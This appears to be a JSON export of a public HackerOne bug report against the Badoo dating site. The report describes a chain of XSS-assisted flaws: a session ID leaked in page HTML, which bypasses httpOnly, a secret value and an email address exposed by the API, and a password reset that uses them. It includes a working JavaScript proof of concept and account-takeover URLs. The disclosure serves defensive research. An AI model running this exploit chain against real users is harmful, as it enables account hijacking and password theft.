{"id":119794,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTk3OTQ=","url":"https://hackerone.com/reports/119794","title":"Password modification without knowing actual password \u0026 httpOnly bypass","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2016-03-01T16:30:23.122Z","submitted_at":"2016-03-01T16:30:23.122Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ngocdh","url":"/ngocdh","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1926,"url":"https://hackerone.com/badoo","handle":"badoo","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/926/2d5179ec8d7d7c36af59a55d318dace33c3aa109_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/926/2d5179ec8d7d7c36af59a55d318dace33c3aa109_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Badoo","twitter_handle":"Badoo","website":"https://badoo.com","about":"Meet new people"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-04-12T19:20:42.808Z","bug_reporter_agreed_on_going_public_at":"2016-03-16T12:15:24.072Z","team_member_agreed_on_going_public_at":"2016-04-12T19:20:42.732Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","vulnerability_information_html":"","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-04-15T12:15:24.229Z","allow_singular_disclosure_after":-148493084.21083277,"singular_disclosure_allowed":true,"vote_count":4,"voters":["sameerphad72","powerjacobb1","dz_samir","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":819051,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-01T16:31:44.002Z","updated_at":"2016-03-01T16:31:44.002Z","actor":{"username":"ngocdh","cleared":true,"url":"/ngocdh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":820667,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-02T12:25:34.187Z","updated_at":"2016-03-02T12:25:34.187Z","actor":{"username":"iyakovlev","cleared":false,"url":"/iyakovlev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/745/0021196ae41e34df146de08f7438520dcebfded9_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":820799,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-02T13:43:04.224Z","updated_at":"2016-03-02T13:43:04.224Z","actor":{"username":"ngocdh","cleared":true,"url":"/ngocdh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":824379,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-04T15:35:10.728Z","updated_at":"2016-03-04T15:35:10.728Z","actor":{"username":"iyakovlev","cleared":false,"url":"/iyakovlev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/745/0021196ae41e34df146de08f7438520dcebfded9_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":830565,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-09T09:08:49.590Z","updated_at":"2016-03-09T09:08:49.590Z","actor":{"username":"ngocdh","cleared":true,"url":"/ngocdh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":841371,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-15T16:47:16.575Z","updated_at":"2016-03-15T16:47:16.575Z","actor":{"username":"ngocdh","cleared":true,"url":"/ngocdh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":841709,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-15T19:28:40.011Z","updated_at":"2016-03-15T19:28:40.011Z","actor":{"username":"iyakovlev","cleared":false,"url":"/iyakovlev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/745/0021196ae41e34df146de08f7438520dcebfded9_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":841766,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-15T19:58:42.562Z","updated_at":"2016-03-15T19:58:42.562Z","actor":{"username":"ngocdh","cleared":true,"url":"/ngocdh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":841888,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-15T20:43:11.817Z","updated_at":"2016-03-15T20:43:11.817Z","actor":{"username":"iyakovlev","cleared":false,"url":"/iyakovlev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/745/0021196ae41e34df146de08f7438520dcebfded9_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":841972,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-15T21:17:00.728Z","updated_at":"2016-03-15T21:17:00.728Z","actor":{"username":"ngocdh","cleared":true,"url":"/ngocdh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":842836,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-16T08:56:49.973Z","updated_at":"2016-03-16T08:56:49.973Z","actor":{"username":"ngocdh","cleared":true,"url":"/ngocdh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":842983,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-16T10:53:21.832Z","updated_at":"2016-03-16T10:53:21.832Z","actor":{"username":"uyga","cleared":false,"url":"/uyga","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/780/942fbff2730b14a4cb3450a1c78b108cf3abbe91_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":843101,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-16T12:15:04.447Z","updated_at":"2016-03-16T12:15:04.447Z","actor":{"username":"ngocdh","cleared":true,"url":"/ngocdh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":843103,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-16T12:15:24.099Z","updated_at":"2016-03-16T12:15:24.099Z","first_to_agree":true,"actor":{"username":"ngocdh","cleared":true,"url":"/ngocdh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":843113,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-16T12:22:01.124Z","updated_at":"2016-03-16T12:22:01.124Z","actor":{"username":"uyga","cleared":false,"url":"/uyga","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/780/942fbff2730b14a4cb3450a1c78b108cf3abbe91_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":901970,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-12T19:20:42.759Z","updated_at":"2016-04-12T19:20:42.759Z","actor":{"username":"uyga","cleared":false,"url":"/uyga","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/780/942fbff2730b14a4cb3450a1c78b108cf3abbe91_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":901971,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-12T19:20:42.828Z","updated_at":"2016-04-12T19:20:42.828Z","actor":{"username":"uyga","cleared":false,"url":"/uyga","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/780/942fbff2730b14a4cb3450a1c78b108cf3abbe91_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"badoo","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":1662,"category":"team","content":"Two issues:\n\nSession cookie is returned in HTML source code of /encounters page, which would allow an XSS attacker to steal it, even if httpOnly is activated.\nA secret value, present in HTML source code of some api.phtml pages, can be used to modify user's password without knowing actual one.\nPrivacy issue : user's email address, hiden in user interface, can be found when sending a POST request to /api.phtml?SERVER_APP_STARTUP\nCombining these three issues, an XSS attacker can steal session cookie and modify user's password without knowing actual one.\n\nThe following POC (works in Chrome latest version) bypasses HttpOnly to retrieve the session cookie, and then do a POST to /api.phtml to retrieve the secret value (see Screenshot):\n\n/POC - BEGIN/\nvar xmlhttp = new XMLHttpRequest();\nxmlhttp.onreadystatechange = function() {\nif (xmlhttp.readyState == XMLHttpRequest.DONE) {\na=xmlhttp.responseText.substr(xmlhttp.responseText.search(\"session_id\\\":\\\"\")+13);b=a.substr(0,a.search(\"\\\"\"));//alert(b);\nvar xmlhttp2 = new XMLHttpRequest();\nxmlhttp2.onreadystatechange = function() {\nif (xmlhttp2.readyState == XMLHttpRequest.DONE) {\na2=xmlhttp2.responseText.substr(xmlhttp2.responseText.search(\"secret=\")+7);b2=a2.substr(0,a2.search(\"\\\"\"));alert(b2);\n}\n}\nxmlhttp2.open(\"POST\", \"/api.phtml?SERVER_GET_USER\");\nxmlhttp2.setRequestHeader(\"Content-Type\", \"json\");\nxmlhttp2.setRequestHeader(\"X-Session-id\", b);\nxmlhttp2.send(JSON.stringify({\"$gpb\":\"badoo.bma.BadooMessage\",\"version\":1,\"message_type\":403,\"message_id\":13,\"body\":[{\"$gpb\":\"badoo.bma.MessageBody\",\"message_type\":403,\"server_get_user\":{\"$gpb\":\"badoo.bma.ServerGetUser\",\"user_id\":$s.user_id.toString(),\"user_field_filter\":{\"$gpb\":\"badoo.bma.UserFieldFilter\",\"projection\":[100]},\"client_source\":0}}]}));\n}\n}\nxmlhttp.open(\"GET\", \"/encounters\",true);\nxmlhttp.send();\n/POC - END/\n\nNote that with the \"secret\" value and user's UID, an attacker can access user's account anytime using the following URL:\nhttps://eu1.badoo.com/access.phtml?UID=[UID]\u0026secret=[secret]\n\nSimilarily, user's email can be retrieved by send POST request to /api.phtml?SERVER_APP_STARTUP.\n\nThe attacker can then go to the following URL to change user's password:\nhttps://eu1.badoo.com/forgot_enter.phtml?code=[secret]\u0026email=[email]","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eTwo issues:\u003c/p\u003e\n\n\u003cp\u003eSession cookie is returned in HTML source code of /encounters page, which would allow an XSS attacker to steal it, even if httpOnly is activated.\u003cbr\u003e\nA secret value, present in HTML source code of some api.phtml pages, can be used to modify user\u0026#39;s password without knowing actual one.\u003cbr\u003e\nPrivacy issue : user\u0026#39;s email address, hiden in user interface, can be found when sending a POST request to /api.phtml?SERVER_APP_STARTUP\u003cbr\u003e\nCombining these three issues, an XSS attacker can steal session cookie and modify user\u0026#39;s password without knowing actual one.\u003c/p\u003e\n\n\u003cp\u003eThe following POC (works in Chrome latest version) bypasses HttpOnly to retrieve the session cookie, and then do a POST to /api.phtml to retrieve the secret value (see Screenshot):\u003c/p\u003e\n\n\u003cp\u003e/POC - BEGIN/\u003cbr\u003e\nvar xmlhttp = new XMLHttpRequest();\u003cbr\u003e\nxmlhttp.onreadystatechange = function() {\u003cbr\u003e\nif (xmlhttp.readyState == XMLHttpRequest.DONE) {\u003cbr\u003e\na=xmlhttp.responseText.substr(xmlhttp.responseText.search(\u0026quot;session_id\\\u0026quot;:\\\u0026quot;\u0026quot;)+13);b=a.substr(0,a.search(\u0026quot;\\\u0026quot;\u0026quot;));//alert(b);\u003cbr\u003e\nvar xmlhttp2 = new XMLHttpRequest();\u003cbr\u003e\nxmlhttp2.onreadystatechange = function() {\u003cbr\u003e\nif (xmlhttp2.readyState == XMLHttpRequest.DONE) {\u003cbr\u003e\na2=xmlhttp2.responseText.substr(xmlhttp2.responseText.search(\u0026quot;secret=\u0026quot;)+7);b2=a2.substr(0,a2.search(\u0026quot;\\\u0026quot;\u0026quot;));alert(b2);\u003cbr\u003e\n}\u003cbr\u003e\n}\u003cbr\u003e\nxmlhttp2.open(\u0026quot;POST\u0026quot;, \u0026quot;/api.phtml?SERVER_GET_USER\u0026quot;);\u003cbr\u003e\nxmlhttp2.setRequestHeader(\u0026quot;Content-Type\u0026quot;, \u0026quot;json\u0026quot;);\u003cbr\u003e\nxmlhttp2.setRequestHeader(\u0026quot;X-Session-id\u0026quot;, b);\u003cbr\u003e\nxmlhttp2.send(JSON.stringify({\u0026quot;$gpb\u0026quot;:\u0026quot;badoo.bma.BadooMessage\u0026quot;,\u0026quot;version\u0026quot;:1,\u0026quot;message_type\u0026quot;:403,\u0026quot;message_id\u0026quot;:13,\u0026quot;body\u0026quot;:[{\u0026quot;$gpb\u0026quot;:\u0026quot;badoo.bma.MessageBody\u0026quot;,\u0026quot;message_type\u0026quot;:403,\u0026quot;server_get_user\u0026quot;:{\u0026quot;$gpb\u0026quot;:\u0026quot;badoo.bma.ServerGetUser\u0026quot;,\u0026quot;user_id\u0026quot;:$s.user_id.toString(),\u0026quot;user_field_filter\u0026quot;:{\u0026quot;$gpb\u0026quot;:\u0026quot;badoo.bma.UserFieldFilter\u0026quot;,\u0026quot;projection\u0026quot;:[100]},\u0026quot;client_source\u0026quot;:0}}]}));\u003cbr\u003e\n}\u003cbr\u003e\n}\u003cbr\u003e\nxmlhttp.open(\u0026quot;GET\u0026quot;, \u0026quot;/encounters\u0026quot;,true);\u003cbr\u003e\nxmlhttp.send();\u003cbr\u003e\n/POC - END/\u003c/p\u003e\n\n\u003cp\u003eNote that with the \u0026quot;secret\u0026quot; value and user\u0026#39;s UID, an attacker can access user\u0026#39;s account anytime using the following URL:\u003cbr\u003e\n\u003ca title=\"https://eu1.badoo.com/access.phtml?UID=%5BUID%5D\u0026amp;secret=%5Bsecret%5D\" href=\"/redirect?url=https%3A%2F%2Feu1.badoo.com%2Faccess.phtml%3FUID%3D%255BUID%255D%26secret%3D%255Bsecret%255D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://eu1.badoo.com/access.phtml?UID=%5BUID%5D\u0026amp;secret=%5Bsecret%5D\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eSimilarily, user\u0026#39;s email can be retrieved by send POST request to /api.phtml?SERVER_APP_STARTUP.\u003c/p\u003e\n\n\u003cp\u003eThe attacker can then go to the following URL to change user\u0026#39;s password:\u003cbr\u003e\n\u003ca title=\"https://eu1.badoo.com/forgot_enter.phtml?code=%5Bsecret%5D\u0026amp;email=%5Bemail%5D\" href=\"/redirect?url=https%3A%2F%2Feu1.badoo.com%2Fforgot_enter.phtml%3Fcode%3D%255Bsecret%255D%26email%3D%255Bemail%255D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://eu1.badoo.com/forgot_enter.phtml?code=%5Bsecret%5D\u0026amp;email=%5Bemail%5D\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}